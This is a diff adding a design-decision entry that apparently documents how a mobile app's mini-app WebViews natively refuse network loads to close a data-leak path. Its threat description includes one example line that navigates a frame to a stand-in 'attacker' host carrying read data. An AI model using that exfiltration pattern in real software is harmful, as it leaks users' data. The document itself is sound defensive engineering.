@@ -1381,3 +1381,39 @@ default `(default)`). `deploy/cloudrun/deploy.sh` deploys with `firestore`. The 
 - **Not done:** more than one instance (`--max-instances` stays 1), TTL policies, PITR, backups.
   Rollback is a deploy with `WHIM_STORE_BACKEND=sqlite`, back to instance-memory state; the
   Firestore data stays, and the `whim-purge` job keeps enforcing retention on it.
+
+### 74. Mini-app WebViews refuse network loads natively; containment gains a fourth leg `[DECIDED — openspec: platform-release-readiness D17; closes the open item in docs/security/2026-09-14-webrtc-alias.md; makes #64's "no network access" true on device]`
+
+A sandboxed `allow-scripts` frame may navigate its own browsing context, and none of the three web
+legs (#35/#37) stops it: CSP has no directive for a frame navigating itself, the sandbox has no
+token against it, and `location` can't be stripped without breaking the runtime. So
+`location.href = 'http://attacker/?d=…'` (or a meta refresh, or an anchor click) sends one GET with
+whatever the app read. Mini-apps never need the network (generation, probes and reports use RN
+networking in native code), so the WebView itself refuses every network load.
+
+- **Android:** `NetworkDeniedWebViewManager` subclasses `RNCWebViewManager` and sets
+  `settings.blockNetworkLoads = true` in `createViewInstance`, before any prop loads a source;
+  `MainApplication` swaps it in for the one autolinked package and refuses to start otherwise.
+  Chromium turns the setting into cache-only loads for navigations, subresources, fetch/XHR,
+  beacons and prefetches. It does not reach WebSocket, WebTransport or WebRTC, which keep CSP and
+  neutralization.
+- **iOS:** `WhimWebViewNetworkDeny.m` swaps `-[WKWebView initWithFrame:configuration:]` in `+load`
+  and attaches a compiled `WKContentRuleList` blocking `^https?:` and `^wss?:` for every frame of
+  every `WKWebView` in the process. WebRTC stays with neutralization.
+- **Fail closed.** If the rule list isn't compiled (not yet, failed, file missing), the iOS web view
+  starts with page JavaScript off, so the launch ends on the app error surface and Retry works once
+  it compiles. On Android a WebView package change that breaks the subclass fails the build or the
+  startup check.
+- **Proof.** `src/host/NetworkDenyProbeScreen.tsx` plus `node scripts/netdeny/run.mjs canary`: before
+  the fix every navigation variant leaked on the emulator and the simulator; after it the canary
+  counts zero HTTP hits and zero TLS connections (Android API 36 / WebView 151 on 2026-09-15, iOS 27
+  simulator on 2026-09-19), and removing only the deny brings the leak back.
+  `checks/test/release/native-network-deny.suite.ts` locks the wiring in the gate. Desktop Chromium
+  and WebKit can't exercise this leg, so the device probe is its verdict. Physical-device runs and a
+  DNS capture are still open (#37, #38).
+- **Rejected:** `onShouldStartLoadWithRequest` (Android allows the load when JS doesn't answer in
+  250 ms, unproven for subframes, and every mount must remember it); a patch-package prop (new
+  dependency, codegen edit in `node_modules`, re-derived on every upgrade); a post-mount native
+  module (races the first load); `limitsNavigationsToAppBoundDomains` (an allowlist that also
+  restricts the bridge's script injection, iOS only); a dead proxy via
+  `WKWebsiteDataStore.proxyConfigurations` (iOS 17+, still opens a connection).
